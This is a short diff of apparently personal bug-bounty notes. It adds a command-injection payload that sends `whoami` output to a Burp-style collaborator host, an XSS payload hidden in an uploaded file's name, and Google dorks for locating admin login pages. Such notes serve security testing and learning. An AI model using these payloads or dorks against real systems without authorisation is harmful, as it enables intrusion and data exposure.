@@ -46,7 +46,7 @@
           payload used   :  `whoami`.collaborator-url 
           got callback from  :  root.collaborator-url
       
-        
+ 38- if found file upload upload file, intercept it and change the name of file <svg/onload=alert``>.txt and send      
 google dorks :   
   site:target.com inurl:adminintitle:login 
   site:website.comintitle:/admin 
